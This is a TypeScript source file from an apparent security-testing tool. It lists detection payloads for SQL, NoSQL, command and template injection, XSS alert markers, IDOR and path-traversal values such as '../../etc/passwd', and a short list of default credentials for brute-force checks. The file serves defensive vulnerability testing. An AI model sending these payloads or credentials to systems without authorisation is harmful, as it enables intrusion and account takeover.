/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Son of Anton Contributors. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * Predefined payload sets for security testing.
 * Each payload is designed to detect a specific vulnerability class
 * without causing destructive operations.
 */

/**
 * SQL injection test payloads (detection-only, non-destructive).
 */
export const SQL_INJECTION_PAYLOADS = [
	// Classic string-based
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"1' OR '1'='1",
	// Numeric
	'1 OR 1=1',
	'1 OR 1=1--',
	// Union-based detection
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	// Time-based blind (non-destructive)
	"'; WAITFOR DELAY '0:0:2'--",
	"' AND SLEEP(2)--",
	// Error-based
	"' AND 1=CONVERT(int, @@version)--",
	"' AND extractvalue(1, concat(0x7e, version()))--",
];

/**
 * NoSQL injection test payloads.
 */
export const NOSQL_INJECTION_PAYLOADS = [
	'{"$gt": ""}',
	'{"$ne": null}',
	'{"$regex": ".*"}',
	'{"$where": "1==1"}',
	"' || '1'=='1",
	'true, $where: \'1 == 1\'',
];

/**
 * Command injection test payloads (non-destructive).
 */
export const COMMAND_INJECTION_PAYLOADS = [
	'; echo pen-test-marker',
	'| echo pen-test-marker',
	'`echo pen-test-marker`',
	'$(echo pen-test-marker)',
	'; id',
	'| id',
	'; whoami',
	'| whoami',
];

/**
 * Template injection test payloads.
 */
export const TEMPLATE_INJECTION_PAYLOADS = [
	'{{7*7}}',
	'${7*7}',
	'<%= 7*7 %>',
	'#{7*7}',
	'{{constructor.constructor("return 1")()}}',
	'${constructor.constructor("return 1")()}',
];

/**
 * XSS test payloads (detection markers, not actual attacks).
 */
export const XSS_PAYLOADS = [
	'<script>alert("xss-test-marker")</script>',
	'<img src=x onerror=alert("xss-test-marker")>',
	'<svg onload=alert("xss-test-marker")>',
	'" onmouseover="alert(\'xss-test-marker\')"',
	"'><script>alert('xss-test-marker')</script>",
	'javascript:alert("xss-test-marker")',
	'<img src="x" onerror="alert(\'xss-test-marker\')">',
	'"><img src=x onerror=alert("xss-test-marker")>',
];

/**
 * Common IDOR test ID values.
 */
export const IDOR_TEST_IDS = [
	'1',
	'0',
	'-1',
	'999999',
	'admin',
	'../../etc/passwd',
	'null',
	'undefined',
];

/**
 * Brute force test — a small list of commonly-leaked credentials.
 * This is intentionally short to stay within the 100-request limit.
 */
export const COMMON_CREDENTIALS = [
	{ username: 'admin', password: 'admin' },
	{ username: 'admin', password: 'password' },
	{ username: 'admin', password: '123456' },
	{ username: 'root', password: 'root' },
	{ username: 'test', password: 'test' },
	{ username: 'user', password: 'user' },
	{ username: 'admin', password: 'admin123' },
	{ username: 'admin', password: 'Password1' },
];
